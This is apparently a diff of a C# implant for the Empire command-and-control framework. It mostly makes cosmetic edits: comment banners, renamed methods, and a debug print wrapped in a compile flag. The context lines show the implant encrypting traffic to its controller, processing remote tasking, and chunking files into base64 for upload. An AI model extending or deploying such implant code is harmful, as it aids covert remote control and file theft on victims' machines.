@@ -28,6 +28,8 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
         private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
         {
             int encryptedBytesLength = 0;
@@ -53,6 +55,8 @@ namespace Sharpire
             return routingPacketData;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        //
         ////////////////////////////////////////////////////////////////////////////////
         internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
         {
@@ -138,7 +142,9 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         internal void SendMessage(byte[] packets)
         {
+#if (PRINT)
             Console.WriteLine("Sending");
+#endif
             byte[] ivBytes = NewInitializationVector(16);
             byte[] encryptedBytes = new byte[0];
             using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
@@ -185,7 +191,7 @@ namespace Sharpire
         {
             byte[] taskingBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), encryptedTask);
             PACKET firstPacket = DecodePacket(taskingBytes, 0);
-            byte[] resultPackets = processTasking(firstPacket);
+            byte[] resultPackets = ProcessTasking(firstPacket);
             SendMessage(resultPackets);
 
             int offset = 12 + (int)firstPacket.length;
@@ -195,7 +201,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         //The hard part
         ////////////////////////////////////////////////////////////////////////////////
-        private byte[] processTasking(PACKET packet)
+        private byte[] ProcessTasking(PACKET packet)
         {
             byte[] returnPacket = new byte[0];
             try
@@ -255,6 +261,8 @@ namespace Sharpire
             }
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        //
         ////////////////////////////////////////////////////////////////////////////////
         internal byte[] EncodePacket(ushort type, string[] data, ushort resultId)
         {
@@ -381,7 +389,7 @@ namespace Sharpire
                 string filePart = "";
                 do
                 {
-                    byte[] filePartBytes = Agent.getFilePart(path, index, chunkSize);
+                    byte[] filePartBytes = Agent.GetFilePart(path, index, chunkSize);
                     filePart = Convert.ToBase64String(filePartBytes);
                     if (filePart.Length > 0)
                     {
